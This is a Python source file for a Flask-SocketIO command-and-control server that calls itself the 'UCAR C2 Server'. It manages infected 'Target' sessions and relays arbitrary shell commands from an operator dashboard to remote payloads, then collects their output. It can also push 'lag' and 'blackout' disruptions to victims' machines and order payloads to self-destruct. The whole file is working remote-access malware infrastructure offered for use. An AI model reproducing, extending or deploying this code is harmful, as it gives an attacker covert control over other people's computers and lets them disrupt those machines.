import os
import eventlet
eventlet.monkey_patch()
from flask import Flask, request
from flask_socketio import SocketIO, emit, join_room
import time

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
socketio = SocketIO(app, async_mode='eventlet', cors_allowed_origins="*")

sessions = {}
blacklist = set()
socket_to_uuid = {}

@app.route('/')
def health_check(): return "UCAR C2 Server is Operational", 200

def check_offline_sessions():
    while True:
        socketio.sleep(5)
        now = time.time()
        changed = False
        for sid, data in list(sessions.items()):
            if data['status'] == 'online' and now - data['last_seen'] > 20:
                sessions[sid]['status'] = 'offline'
                changed = True
        if changed: socketio.emit('session_list_update', sessions, namespace='/dashboard')
socketio.start_background_task(check_offline_sessions)

@socketio.on('connect', namespace='/dashboard')
def dashboard_connect(): emit('session_list_update', sessions)

@socketio.on('execute_command', namespace='/dashboard')
def execute_command(data):
    if (sid := data.get('session_id')) in sessions: socketio.emit('run_command', {'command': data.get('command')}, namespace='/payload', room=sid)

@socketio.on('update_lag_state', namespace='/dashboard')
def handle_lag(data):
    sid = data.get('session_id')
    if sid in sessions:
        sessions[sid]['lag_status'] = data.get('status')
        sessions[sid]['lag_intensity'] = data.get('intensity')
        socketio.emit('command_update_lag', data, namespace='/payload', room=sid)
        emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')

@socketio.on('update_blackout_state', namespace='/dashboard')
def handle_blackout(data):
    sid = data.get('session_id')
    if sid in sessions:
        sessions[sid]['blackout_status'] = data.get('status')
        socketio.emit('command_blackout', {'status': data.get('status')}, namespace='/payload', room=sid)
        emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')

@socketio.on('delete_session', namespace='/dashboard')
def delete_session(data):
    if sid := data.get('session_id'):
        blacklist.add(sid)
        socketio.emit('command_self_destruct', {}, namespace='/payload', room=sid)
        if sid in sessions: del sessions[sid]; emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')

@socketio.on('update_nametag', namespace='/dashboard')
def update_nametag(data):
    if (sid := data.get('session_id')) in sessions:
        sessions[sid]['nametag'] = data.get('nametag')
        emit('session_list_update', sessions, broadcast=True, namespace='/dashboard')

@socketio.on('clear_blacklist', namespace='/dashboard')
def clear_blacklist(data): blacklist.clear()

@socketio.on('disconnect', namespace='/payload')
def on_payload_disconnect():
    if (sid := socket_to_uuid.get(request.sid)) and sid in sessions:
        sessions[sid]['status'] = 'offline'
        socketio.emit('session_list_update', sessions, namespace='/dashboard')
    if request.sid in socket_to_uuid: del socket_to_uuid[request.sid]

@socketio.on('command_result', namespace='/payload')
def command_result(data):
    if data.get('session_id'): socketio.emit('command_output', data, namespace='/dashboard')

@socketio.on('payload_register', namespace='/payload')
def payload_register(data):
    if not (sid := data.get('session_id')): return
    socket_to_uuid[request.sid] = sid
    if sid in blacklist: join_room(sid); emit('command_self_destruct', {}, namespace='/payload', room=sid); return
    join_room(sid)
    
    is_new = False
    if sid not in sessions:
        is_new = True
        sessions[sid] = {'nametag': f'Target-{sid[:4]}', 'status': 'online', 'last_seen': time.time(), 'lag_status': 'off', 'lag_intensity': 5, 'blackout_status': 'off'}
    else:
        if sessions[sid]['status'] == 'offline': is_new = True
        sessions[sid]['status'] = 'online'
        sessions[sid]['last_seen'] = time.time()
    
    if is_new: socketio.emit('session_list_update', sessions, namespace='/dashboard')
    emit('command_update_lag', {'status': sessions[sid]['lag_status'], 'intensity': sessions[sid]['lag_intensity']}, namespace='/payload', room=sid)
    emit('command_blackout', {'status': sessions[sid]['blackout_status']}, namespace='/payload', room=sid)

@socketio.on('payload_heartbeat', namespace='/payload')
def heartbeat(data):
    if (sid := data.get('session_id')) in sessions:
        if sessions[sid]['status'] == 'offline':
            sessions[sid]['status'] = 'online'
            socketio.emit('session_list_update', sessions, namespace='/dashboard')
        sessions[sid]['last_seen'] = time.time()
    elif sid in blacklist: emit('command_self_destruct', {}, namespace='/payload', room=sid)

if __name__ == '__main__':
    socketio.run(app, debug=True, port=5000)
